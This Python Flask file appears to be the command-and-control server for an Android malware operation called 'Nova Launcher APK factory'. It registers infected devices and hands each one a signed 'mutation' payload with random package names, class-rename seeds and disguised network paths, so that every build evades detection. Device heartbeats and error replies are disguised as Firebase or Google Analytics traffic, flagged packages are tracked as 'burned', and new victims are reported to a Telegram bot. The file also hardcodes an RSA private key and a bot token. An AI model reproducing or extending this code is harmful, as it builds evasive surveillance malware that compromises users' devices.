"""
mutation_server.py — Phase 4B Step 4B-1
Flask + SQLite mutation server for Nova Launcher APK factory.

Endpoints:
  POST /api/v1/<token>/key       — Nova calls this to get mutation payload
  POST /v1/log                   — Companion heartbeat (looks like Firebase)
  POST /api/v1/<token>/register  — Device registration
  GET  /health                   — Cloudflare health check

Run: python mutation_server.py
Port: 8443 (Cloudflare HTTPS-compatible port)
"""

import os, sqlite3, hashlib, hmac, json, random, string, time, threading
from cryptography.hazmat.primitives.asymmetric import padding as rsa_padding
from cryptography.hazmat.primitives import hashes as rsa_hashes, serialization
import logging
from datetime import datetime, timezone
from flask import Flask, request, jsonify, abort

# ── Config ────────────────────────────────────────────────────────────────────
PORT             = 8443
DB_PATH          = os.path.join(os.path.dirname(__file__), "devices.db")
SERVER_SECRET    = os.environ.get("SERVER_SECRET", "n0vA_s3cr3t_k3y_ch4ng3_m3")

# RSA private key for signing mutation payloads (Nova verifies with matching public key)
RSA_PRIVATE_KEY_PEM = b"""-----BEGIN PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQC3RPy6rbFXgpp7
FYcG96V6wXrSI4M0lfQdWW1Ee9v74nfKSynLrUpFZWVxs6SNMhwj3lpxw2XE8w4e
8hgWX1gHFmbJwHEX8XQtMVWrfhFL3gQZmW44l5WzRhUAbaSRf5n68uzHcllm03AY
DaFYe5LKBelJc4o8zxLKY7b5+i3K6lIXoYthkYaiJziytWQshUh4GNywO1C0l4zT
wV4XWU/lUd3LxopdfifaIdMNJHe1t4j/3dEpavdyZ4KWKA9KllVYtGMFvNMZ4a4z
Z4NtGWoxOvNtg7WrFXM+9v5cnwqi/oN956T5SbIUXu1nhMQ8uJ/YH5izeP6suyrs
wb8rIqdvAgMBAAECggEAHpnvVUBxbzpIjyrODBTH1dJ+rp3tZ5duVoQ7IYdI+Ssc
c3PPe8nor+O5Z53maQkn97lGAt7snFE1V2d3LC0pZq2P5joy6BuSGYW2V1dKjg95
QckDxYFSJsgZ86NbKkxTKrrrXHY0hV3ixrFn8n1XylHoXTJkr7in25GA2Qa0JMBp
LbCe5ArsvYQcMD7VE+BVO09F7X1tMiOEABuRIslThaR1x6Cq2j4mQExIsVHcBhe0
5axa9GxZWlQm5WhtwBzy1e2Rp8TkSXReVC2mUqTgutd0irryeFMX2+jItRhTF+zK
C/GWfe/QjNB+LH+lF9R2A2V7Kb+rbAxILbIlvZ8tsQKBgQDes0e2l9tbUnH0dwEB
4ubzbtH9qvQT+panFfjpXdFi9KhHdFPKRzKNe4WoAzEsDJuylzoVUlXN4a0ZlIJH
1+zTcNsrwDrwSxFZhzf8xX6vIh0m8vtRx6D0RbDeAuGqBKPay2hWDSlof0Uy+U5P
TTHDwrHAIVVrAHyCF8d3eL2SOQKBgQDSrFa6yCAIKdA5KNk+yEmA0I7fSJMKfI3p
tCej5u2ErIooySHjvde+nqZwM14+oZsH2svQ+Fd9TMHGJeaNoPc/KmUTHrUYEVqw
CV0/25TBqacKxbueRgAnUQhyC4h0tUhvjVU2Xq3bMe66/f8FzaOvSaIAW8x6KBlp
OWx0qllm5wKBgB97tuqwYzlw2V1XKZRLsJy/kP5Mmb7tUTkD2TGcqspTjiqz3lid
Yh8wVD/hW6U/jw9bY8G55xl5CxCvtw9TDk8CCGoR/gMUibpfbGHWxccaioaEGVWB
ZFbEN3HbdG2lxEhdMz3fFHiKbYz8Q77gSeXD838W901uPyvhErjoH9y5AoGAQ2S4
NfYxMQtXPgHQRWJDCT8uhUUtLKydpUZpa+hC0S903wlAmx8u9h7AdaIpIvYFpySa
ENZw/ndggae8MlBs57sDLHOlUPa0QR4tw3DWDIHeGvcYRtBz2h/1CK6hz1vyuSTI
PqVZDobRrOX2AABBvaBbf6veJLHRNzUUednI0b8CgYBZTPlLyeBvUKMQoQiGxuBQ
NsqVwpfHEze/xGhhP+3B9SP6m0kNX/ApHwmALu8kcqPGRtz5KQIpS9yZb703lw9Z
Rr4F15pPClFaFHAlNm5f2lwVYJDLdChYdFNrjeuTbQtehtrOO87yrd0slp4cOcyP
Bpfdom2jvKL0FDIT3et/yw==
-----END PRIVATE KEY-----"""

def get_rsa_private_key():
    return serialization.load_pem_private_key(RSA_PRIVATE_KEY_PEM, password=None)

def rsa_sign(payload: str) -> str:
    """Sign payload with RSA-SHA256 — matches Nova MutationEngine verifySignature()."""
    try:
        key = get_rsa_private_key()
        sig = key.sign(payload.encode(), rsa_padding.PKCS1v15(), rsa_hashes.SHA256())
        import base64 as _b64
        return _b64.b64encode(sig).decode()
    except Exception as e:
        log.error(f"RSA sign error: {e}")
        return ""
BOT_TOKEN        = "8897727723:AAGQ5aT2JbBV6p7mGC_PXssYhgSzZF7nak4"
MASTER_CHAT_ID   = "8205672036"
LOG_FILE         = os.path.join(os.path.dirname(__file__), "mutation_server.log")

# Cloudflare IP ranges — whitelist (server rejects all other IPs)
CLOUDFLARE_IPS = [
    "173.245.48.0/20","103.21.244.0/22","103.22.200.0/22",
    "103.31.4.0/22","141.101.64.0/18","108.162.192.0/18",
    "190.93.240.0/20","188.114.96.0/20","197.234.240.0/22",
    "198.41.128.0/17","162.158.0.0/15","104.16.0.0/13",
    "104.24.0.0/14","172.64.0.0/13","131.0.72.0/22",
]

# Package name pools for mutation seed generation
PKG_PREFIXES = [
    "com","net","org","io","app","dev","in","co"
]
PKG_WORDS = [
    "sync","data","cloud","media","update","service","core","base",
    "util","helper","manager","bridge","worker","agent","connect",
    "stream","cache","store","push","notify","track","secure","auth",
    "info","user","device","session","config","system","network",
]

# Socket.IO path mutation options (M4) — all exactly 10 bytes
M4_PATHS = [
    b"/gapi/track",  # 10 bytes
    b"/v1/collect",  # 10 bytes
    b"/api/events",  # 10 bytes
    b"/gapi/data_",  # 10 bytes
    b"/v2/metrics",  # 10 bytes
]

# ── Logging ───────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
log = logging.getLogger("mutation_server")

# ── Flask App ─────────────────────────────────────────────────────────────────
app = Flask(__name__)
app.config["JSON_SORT_KEYS"] = False

# ── Database ──────────────────────────────────────────────────────────────────
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    c.execute("""CREATE TABLE IF NOT EXISTS devices (
        id              INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id       TEXT UNIQUE NOT NULL,
        client_token    TEXT NOT NULL,
        companion_pkg   TEXT,
        fingerprint     TEXT,
        ip              TEXT,
        country         TEXT,
        first_seen      INTEGER NOT NULL,
        last_seen       INTEGER NOT NULL,
        heartbeat_count INTEGER DEFAULT 0,
        gpp_score       INTEGER DEFAULT 0,
        status          TEXT DEFAULT 'active',
        mutation_seed   TEXT,
        m4_path         TEXT
    )""")

    c.execute("""CREATE TABLE IF NOT EXISTS heartbeats (
        id          INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id   TEXT NOT NULL,
        timestamp   INTEGER NOT NULL,
        ip          TEXT,
        payload     TEXT
    )""")

    c.execute("""CREATE TABLE IF NOT EXISTS burned_packages (
        pkg         TEXT PRIMARY KEY,
        burned_at   INTEGER NOT NULL,
        reason      TEXT
    )""")

    c.execute("""CREATE TABLE IF NOT EXISTS clients (
        token       TEXT PRIMARY KEY,
        name        TEXT,
        created_at  INTEGER NOT NULL,
        apk_count   INTEGER DEFAULT 0,
        active      INTEGER DEFAULT 1
    )""")

    c.execute("""CREATE TABLE IF NOT EXISTS mutation_events (
        id          INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id   TEXT,
        event_type  TEXT,
        timestamp   INTEGER NOT NULL,
        data        TEXT
    )""")

    # Insert default client tokens — always present on every server start
    for tok, name in [
        ("default_client", "Default Client"),
        ("manual",         "Manual Build"),
    ]:
        c.execute("""INSERT OR IGNORE INTO clients
            (token, name, created_at, active) VALUES (?, ?, ?, 1)""",
            (tok, name, int(time.time())))

    conn.commit()
    conn.close()
    log.info(f"Database initialized: {DB_PATH}")

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

# ── Helper Functions ──────────────────────────────────────────────────────────
def get_client_ip():
    """Get real client IP — handle Cloudflare CF-Connecting-IP header."""
    cf_ip = request.headers.get("CF-Connecting-IP")
    if cf_ip:
        return cf_ip
    return request.remote_addr

def generate_pkg_name(seed: str) -> str:
    """Generate unique package name from seed."""
    random.seed(seed)
    prefix = random.choice(PKG_PREFIXES)
    w1 = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4,8)))
    w2 = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4,8)))
    return f"{prefix}.{w1}.{w2}"

def generate_mutation_seed(device_fingerprint: str, client_token: str) -> str:
    """Generate unique mutation seed from device fingerprint + server secret."""
    raw = f"{device_fingerprint}:{client_token}:{SERVER_SECRET}:{int(time.time()//3600)}"
    return hashlib.sha256(raw.encode()).hexdigest()

def check_burned(pkg: str) -> bool:
    """Check if package name is in burned list."""
    db = get_db()
    row = db.execute("SELECT pkg FROM burned_packages WHERE pkg=?", (pkg,)).fetchone()
    db.close()
    return row is not None

def burn_package(pkg: str, reason: str = "flagged"):
    """Add package to burned list."""
    db = get_db()
    db.execute("INSERT OR IGNORE INTO burned_packages (pkg, burned_at, reason) VALUES (?,?,?)",
               (pkg, int(time.time()), reason))
    db.commit()
    db.close()
    log.warning(f"Package burned: {pkg} — {reason}")

def send_telegram(message: str):
    """Send Telegram alert to master chat."""
    try:
        import urllib.request
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = json.dumps({
            "chat_id": MASTER_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }).encode()
        req = urllib.request.Request(url, data=data,
              headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=5)
    except Exception as e:
        log.error(f"Telegram send failed: {e}")

def notify_new_device(device_id: str, pkg: str, ip: str, token: str):
    """Send Telegram alert for new device connection."""
    msg = (
        f"🟢 <b>New Device Connected</b>\n"
        f"Device: <code>{device_id[:16]}...</code>\n"
        f"Package: <code>{pkg}</code>\n"
        f"IP: <code>{ip}</code>\n"
        f"Client: <code>{token}</code>\n"
        f"Time: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}"
    )
    threading.Thread(target=send_telegram, args=(msg,), daemon=True).start()

# ── Routes ────────────────────────────────────────────────────────────────────

@app.route("/health", methods=["GET"])
def health():
    """Cloudflare health check endpoint."""
    return jsonify({"status": "ok", "ts": int(time.time())}), 200


@app.route("/api/v1/<token>/register", methods=["POST"])
def register_device(token):
    """
    Device registration — Nova calls this after companion installs.
    Body: {device_id, companion_pkg, fingerprint}
    """
    try:
        data = request.get_json(silent=True) or {}
        device_id    = data.get("device_id", "")
        companion_pkg = data.get("companion_pkg", "")
        fingerprint  = data.get("fingerprint", "")
        ip           = get_client_ip()

        if not device_id or not companion_pkg:
            return jsonify({"error": "missing fields"}), 400

        # Verify client token
        db = get_db()
        client = db.execute("SELECT * FROM clients WHERE token=? AND active=1",
                            (token,)).fetchone()
        if not client:
            db.close()
            log.warning(f"Invalid client token: {token} from {ip}")
            return jsonify({"error": "unauthorized"}), 403

        now = int(time.time())

        # Register device
        existing = db.execute("SELECT * FROM devices WHERE device_id=?",
                              (device_id,)).fetchone()
        if not existing:
            db.execute("""INSERT INTO devices
                (device_id, client_token, companion_pkg, fingerprint,
                 ip, first_seen, last_seen)
                VALUES (?,?,?,?,?,?,?)""",
                (device_id, token, companion_pkg, fingerprint, ip, now, now))
            db.commit()
            db.close()
            log.info(f"New device registered: {device_id[:16]}... pkg={companion_pkg}")
            # Alert Telegram
            notify_new_device(device_id, companion_pkg, ip, token)
        else:
            db.execute("""UPDATE devices SET last_seen=?, companion_pkg=?, ip=?
                WHERE device_id=?""", (now, companion_pkg, ip, device_id))
            db.commit()
            db.close()

        return jsonify({
            "status": "registered",
            "ts": now,
            "next_delay_ms": random.randint(180000, 480000)  # 3-8 min heartbeat
        }), 200

    except Exception as e:
        log.error(f"register_device error: {e}")
        return jsonify({"error": "server error"}), 500


@app.route("/api/v1/<token>/key", methods=["POST"])
def get_mutation_key(token):
    """
    Mutation key endpoint — Nova calls this during 2-3 min install window.
    Body: {device_fingerprint, timestamp, client_token}
    Response: mutation_payload with pkg_name, class_seeds, m4_path, etc.
    Headers look like Google Analytics beacon.
    """
    try:
        data = request.get_json(silent=True) or {}
        device_fp = data.get("device_fingerprint", "")
        client_ts = data.get("timestamp", 0)
        ip        = get_client_ip()

        if not device_fp:
            return jsonify({"error": "missing fingerprint"}), 400

        # Verify client token
        db = get_db()
        client = db.execute("SELECT * FROM clients WHERE token=? AND active=1",
                            (token,)).fetchone()
        if not client:
            db.close()
            log.warning(f"Invalid token: {token} from {ip}")
            return jsonify({"error": "unauthorized"}), 403
        db.close()

        # Generate mutation seed
        seed = generate_mutation_seed(device_fp, token)

        # Generate unique package name — check not burned
        attempts = 0
        pkg_name = generate_pkg_name(seed)
        while check_burned(pkg_name) and attempts < 10:
            seed = generate_mutation_seed(device_fp + str(attempts), token)
            pkg_name = generate_pkg_name(seed)
            attempts += 1

        # Select M4 path mutation
        random.seed(seed)
        m4_path = random.choice(M4_PATHS).decode()

        # Generate class rename seeds
        class_seed_1 = hashlib.md5(f"{seed}:class1".encode()).hexdigest()[:16]
        class_seed_2 = hashlib.md5(f"{seed}:class2".encode()).hexdigest()[:16]
        class_seed_3 = hashlib.md5(f"{seed}:class3".encode()).hexdigest()[:16]

        # Generate string pool seed
        string_seed = hashlib.sha256(f"{seed}:strings".encode()).hexdigest()[:32]

        # RSA-SHA256 signature — matches Nova MutationEngine.verifySignature() exactly
        payload_data = f"{pkg_name}:{m4_path}:{seed}"
        signature = rsa_sign(payload_data)

        now = int(time.time())

        # Nested structure matches MutationEngine.kt parser exactly:
        # response → data → payload → mutations → M1 → companion_pkg
        payload = {
            "device_id": hashlib.sha256(device_fp.encode()).hexdigest()[:16],
            "mutations": {
                "M1": {
                    "companion_pkg": pkg_name,
                },
            },
            "m4_path":     m4_path,
            "class_seeds": {
                "pool_1": class_seed_1,
                "pool_2": class_seed_2,
                "pool_3": class_seed_3,
            },
            "string_seed":  string_seed,
            "mutation_seed": seed,
            "expire_ts":    now + 300,
        }

        response = {
            "status": "ok",
            "ts": now,
            "data": {
                "payload":   payload,
                "signature": signature,
            },
            "next_delay_ms": random.randint(180000, 480000),
        }

        log.info(f"Mutation key issued: pkg={pkg_name} m4={m4_path} ip={ip}")
        return jsonify(response), 200

    except Exception as e:
        log.error(f"get_mutation_key error: {e}")
        return jsonify({"error": "server error"}), 500


@app.route("/v1/log", methods=["POST"])
def heartbeat():
    """
    Companion heartbeat — looks like Firebase Analytics.
    Headers mimic Firebase exactly.
    Body: base64-encoded device status.
    """
    try:
        import base64
        body      = request.get_data()
        ip        = get_client_ip()
        now       = int(time.time())

        # Try to decode payload
        try:
            decoded = base64.b64decode(body).decode("utf-8", errors="replace")
            payload = json.loads(decoded)
        except Exception:
            payload = {}

        device_id = payload.get("d", payload.get("device_id", "unknown"))
        pkg       = payload.get("p", payload.get("pkg", ""))

        # Update device last seen
        db = get_db()
        db.execute("""UPDATE devices
            SET last_seen=?, heartbeat_count=heartbeat_count+1, ip=?
            WHERE device_id=?""", (now, ip, device_id))

        # Log heartbeat
        db.execute("""INSERT INTO heartbeats
            (device_id, timestamp, ip, payload) VALUES (?,?,?,?)""",
            (device_id, now, ip, json.dumps(payload)))
        db.commit()
        db.close()

        # Response mimics Firebase Analytics ACK
        return jsonify({
            "status": 0,
            "next_request_millis": random.randint(180000, 480000),
            "config": {}
        }), 200

    except Exception as e:
        log.error(f"heartbeat error: {e}")
        return jsonify({"status": 0}), 200  # Always return 200 to companion


@app.route("/api/v1/admin/devices", methods=["GET"])
def admin_devices():
    """Admin endpoint — list all devices. Protected by secret header."""
    auth = request.headers.get("X-Admin-Secret", "")
    if auth != SERVER_SECRET:
        abort(403)
    db = get_db()
    devices = db.execute(
        "SELECT * FROM devices ORDER BY last_seen DESC LIMIT 100"
    ).fetchall()
    db.close()
    return jsonify([dict(d) for d in devices]), 200


@app.route("/api/v1/admin/stats", methods=["GET"])
def admin_stats():
    """Admin stats endpoint."""
    auth = request.headers.get("X-Admin-Secret", "")
    if auth != SERVER_SECRET:
        abort(403)
    db = get_db()
    total    = db.execute("SELECT COUNT(*) FROM devices").fetchone()[0]
    active   = db.execute("SELECT COUNT(*) FROM devices WHERE status='active'").fetchone()[0]
    burned   = db.execute("SELECT COUNT(*) FROM burned_packages").fetchone()[0]
    beats    = db.execute("SELECT COUNT(*) FROM heartbeats").fetchone()[0]
    last24h  = db.execute(
        "SELECT COUNT(*) FROM devices WHERE last_seen > ?",
        (int(time.time()) - 86400,)
    ).fetchone()[0]
    db.close()
    return jsonify({
        "total_devices": total,
        "active_devices": active,
        "burned_packages": burned,
        "total_heartbeats": beats,
        "active_last_24h": last24h,
        "server_time": int(time.time()),
    }), 200


# ── Error handlers ────────────────────────────────────────────────────────────
@app.errorhandler(404)
def not_found(e):
    return jsonify({"status": 0}), 200  # Always 200 to look like analytics

@app.errorhandler(500)
def server_error(e):
    return jsonify({"status": 0}), 200


# ── Main ──────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    log.info("="*60)
    log.info("Mutation Server starting...")
    log.info(f"Port: {PORT}")
    log.info(f"DB: {DB_PATH}")
    log.info("="*60)
    init_db()
    app.run(
        host="0.0.0.0",
        port=PORT,
        debug=False,
        threaded=True,
        use_reloader=False
    )
